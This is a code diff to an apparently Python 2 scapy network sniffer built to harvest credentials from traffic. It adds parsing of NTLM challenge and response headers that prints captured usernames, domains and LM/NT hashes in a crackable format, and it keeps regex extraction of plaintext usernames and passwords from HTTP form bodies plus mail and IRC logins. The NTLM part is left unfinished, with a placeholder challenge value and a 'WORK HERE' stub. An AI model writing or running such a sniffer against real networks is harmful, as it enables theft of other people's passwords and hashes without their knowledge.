@@ -2,11 +2,12 @@
 
 from os import geteuid, devnull
 import logging
+# Be quiet, you
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
 from sys import exit
-#import itertools
+import binascii
 import struct
 import argparse
 import signal
@@ -17,6 +18,15 @@ from collections import OrderedDict
 from BaseHTTPServer import BaseHTTPRequestHandler
 from StringIO import StringIO
 #from IPython import embed
+
+##################################################################################
+# Left off:
+# NTLM parsing is complete, but need way to track tcp sequence numbers so we can 
+# keep track of chal:resp combos. I don't think adding them to pkt_frag dict works
+# because that dict's keys are src_ip_port not tcp stream. Maybe new dict like 
+# psychomario's ntlmparser? Don't forget to change the variable "challenge"
+# within parse_resp_msg()
+##################################################################################
 
 DN = open(devnull, 'w')
 pkt_frag_loads = OrderedDict()
@@ -51,7 +61,7 @@ def frag_remover(ack, load):
     3 points of limit:
         Number of ip_ports < 50
         Number of acks per ip:port < 25
-        Number of chars in load < 75,000
+        Number of chars in load < 100,000
     '''
     global pkt_frag_loads
 
@@ -73,8 +83,8 @@ def frag_remover(ack, load):
     for ip_port in copy_pkt_frag_loads:
         # Keep the load less than 75,000 chars
         for ack in copy_pkt_frag_loads[ip_port]:
-            if len(ack) > 75000:
-                # If load > 75,000 chars, just keep the last 200 chars
+            if len(ack) > 100000:
+                # If load > 100,000 chars, just keep the last 200 chars
                 pkt_frag_loads[ip_port][ack] = pkt_frag_loads[ip_port][ack][-200:]
 
 def frag_joiner(ack, src_ip_port, load):
@@ -134,7 +144,7 @@ def pkt_parser(pkt):
             irc_logins(str_load, src_ip_port, dst_ip_port)
 
         # HTTP
-        http_parser(full_load, str_load)
+        http_parser(full_load, str_load, src_ip_port)
 
 def mail_logins(full_load, str_load, src_ip_port, dst_ip_port):
     '''
@@ -204,7 +214,7 @@ def irc_logins(str_load, src_ip_port, dst_ip_port):
     if irc_pass_re:
         print '[%s > %s] IRC pass: ' % (src_ip_port, dst_ip_port), irc_user_re.group(1).strip()
 
-def http_parser(full_load, str_load):
+def http_parser(full_load, str_load, src_ip_port):
     '''
     Pull out pertinent info from the parsed HTTP packet data
     '''
@@ -212,17 +222,20 @@ def http_parser(full_load, str_load):
     user_passwd = None
     http_url_req = None
     host = None
+    challenge = None
+    response = None
     http_methods = ['GET ', 'POST ', 'CONNECT ', 'TRACE ', 'TRACK ', 'PUT ', 'DELETE ', 'HEAD ']
     http_line, header_lines, body = parse_http_load(full_load)
     headers = headers_to_dict(header_lines)
     method, path = parse_http_line(http_line, http_methods)
     http_url_req = get_http_url(method, path, headers)
-    if http_url_req:
-        print http_url_req
 
     if body != '':
         user_passwd = get_login_pass(body)
 
+    if len(headers) == 0:
+        ntlm_chal_header = None
+        ntlm_resp_header = None
     for header in headers:
         ntlm_chal_header = re.search(msg2_header_re, header)
         ntlm_resp_header = re.search(msg3_header_re, header)
@@ -231,33 +244,25 @@ def http_parser(full_load, str_load):
 
     # Type 2 challenge from server
     if ntlm_chal_header != None:
-        header_val2 = request.headers[ntlm_chal_header.group()]
-        header_val2 = header_val2.split(' ', 1)
-        print 'MSG 2 HEADER VALS:', header_val2[0], header_val2[1]
-        # The header value can either start with NTLM or Negotiate
-        if header_val2[0] == 'NTLM' or header_val2[0] == 'Negotiate':
-            msg2 = header_val2[1]
-            print 'msg2', msg2
-            chal_and_flags = parse_NTLM_CHALLENGE_MESSAGE(msg2)
-            print 'Type 2:', chal_and_flags
+        challenge = parse_chal_msg(headers, ntlm_chal_header.group())
+        if challenge != None:
+            ################ ADD TO PKT FRAGMENT DICT ########### WORK HERE
+            pass
 
     # Type 3 response from client
     if ntlm_resp_header != None:
-        header_val3 = request.headers[ntlm_resp_header.group()]
-        header_val3 = header_val3.split(' ', 1)
-        # The header value can either start with NTLM or Negotiate
-        if header_val3[0] == 'NTLM' or header_val3[0] == 'Negotiate':
-            msg3 = header_val3[1]
-            #print 'msg3', msg3
-            #chal_and_flags = parse_NTLM_CHALLENGE_MESSAGE(msg3)
-            #print 'Type 3:', chal_and_flags
+        response = parse_resp_msg(headers, ntlm_resp_header.group())
 
     ############ PRINT STUFF ###############
     if user_passwd != None:
         print '  User:', user_passwd[0]
         print '  Pass:', user_passwd[1]
-    #if cmd_url:
-    #    print cmd_url
+    if http_url_req:
+        print http_url_req
+    if challenge:
+        print pkt_frag_loads[src_ip_port]
+        pass
+        #print challenge
 
 def get_http_url(method, path, headers):
     '''
@@ -295,15 +300,6 @@ def headers_to_dict(header_lines):
         headers[header.lower()] = headers_dict[header]
 
     return headers
-
-def get_host(header_lines):
-    '''
-    Parse out the host header
-    '''
-    for line in header_lines:
-        if line.lower().startswith('host: '):
-            host = line.split(': ', 1)[1]
-            return host
 
 def parse_http_line(http_line, http_methods):
     '''
@@ -346,7 +342,6 @@ def parse_http_load(full_load):
 
     return http_line, header_lines, body
 
-
 def get_http_line(header_lines, http_methods):
     '''
     Get the header with the http command
@@ -357,37 +352,44 @@ def get_http_line(header_lines, http_methods):
                 http_line = header
                 return http_line
 
-def parse_NTLM_CHALLENGE_MESSAGE(msg2):
+def parse_chal_msg(headers, chal_header):
     '''
     Parse the server challenge
+    https://code.google.com/p/python-ntlm/source/browse/trunk/python26/ntlm/ntlm.py
     '''
+    header_val2 = headers[chal_header]
+    header_val2 = header_val2.split(' ', 1)
+    # The header value can either start with NTLM or Negotiate
+    if header_val2[0] == 'NTLM' or header_val2[0] == 'Negotiate':
+        msg2 = header_val2[1]
     msg2 = base64.decodestring(msg2)
     Signature = msg2[0:8]
     msg_type = struct.unpack("<I",msg2[8:12])[0]
     assert(msg_type==2)
-    TargetNameLen = struct.unpack("<H",msg2[12:14])[0]
-    TargetNameMaxLen = struct.unpack("<H",msg2[14:16])[0]
-    TargetNameOffset = struct.unpack("<I",msg2[16:20])[0]
-    TargetName = msg2[TargetNameOffset:TargetNameOffset+TargetNameMaxLen]
-    NegotiateFlags = struct.unpack("<I",msg2[20:24])[0]
     ServerChallenge = msg2[24:32]
-    Reserved = msg2[32:40]
-    if NegotiateFlags & NTLM_NegotiateTargetInfo:
-        TargetInfoLen = struct.unpack("<H",msg2[40:42])[0]
-        TargetInfoMaxLen = struct.unpack("<H",msg2[42:44])[0]
-        TargetInfoOffset = struct.unpack("<I",msg2[44:48])[0]
-        TargetInfo = msg2[TargetInfoOffset:TargetInfoOffset+TargetInfoLen]
-        i=0
-        TimeStamp = '\0'*8
-        while(i<TargetInfoLen):
-            AvId = struct.unpack("<H",TargetInfo[i:i+2])[0]
-            AvLen = struct.unpack("<H",TargetInfo[i+2:i+4])[0]
-            AvValue = TargetInfo[i+4:i+4+AvLen]
-            i = i+4+AvLen
-            if AvId == NTLM_MsvAvTimestamp:
-                TimeStamp = AvValue 
-    #~ print AvId, AvValue.decode('utf-16')
-    return (ServerChallenge, NegotiateFlags)
+    return ServerChallenge.encode('hex')
+
+def parse_resp_msg(headers, resp_header):
+    '''
+    Parse the client response to the challenge
+    '''
+    challenge = 'x'*16
+    header_val3 = headers[resp_header]
+    header_val3 = header_val3.split(' ', 1)
+    # The header value can either start with NTLM or Negotiate
+    if header_val3[0] == 'NTLM' or header_val3[0] == 'Negotiate':
+        msg3 = base64.decodestring(header_val3[1])
+        # What is this when it's not > 43? Is it msg1?
+        if len(msg3) > 43:
+            lmlen, lmmax, lmoff, ntlen, ntmax, ntoff, domlen, dommax, domoff, userlen, usermax, useroff = struct.unpack("12xhhihhihhihhi", msg3[:44])
+            lmhash = binascii.b2a_hex(msg3[lmoff:lmoff+lmlen])
+            nthash = binascii.b2a_hex(msg3[ntoff:ntoff+ntlen])
+            domain = msg3[domoff:domoff+domlen].replace("\0", "")
+            user = msg3[useroff:useroff+userlen].replace("\0", "")
+            if lmhash != "0"*48: #NTLM
+                print user+"::"+domain+":"+lmhash+":"+nthash+":"+challenge
+            else: #NTLMv2
+                print user+"::"+domain+":"+challenge+":"+nthash[:32]+":"+nthash[32:]
 
 def url_filter(http_url_req):
     '''
@@ -397,10 +399,10 @@ def url_filter(http_url_req):
         d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
         if any(http_url_req.endswith(i) for i in d):
             return
-        else:
-            return http_url_req
 
-def get_login_pass(data):
+    return http_url_req
+
+def get_login_pass(body):
     '''
     Regex out logins and passwords from a string
     '''
@@ -418,11 +420,11 @@ def get_login_pass(data):
                   'passwort', 'passwrd', 'wppassword', 'upasswd']
 
     for login in userfields:
-        login_re = re.search('(%s=[^&]+)' % login, data, re.IGNORECASE)
+        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
         if login_re:
             user = login_re.group()
     for passfield in passfields:
-        pass_re = re.search('(%s=[^&]+)' % passfield, data, re.IGNORECASE)
+        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
         if pass_re:
             passwd = pass_re.group()
 
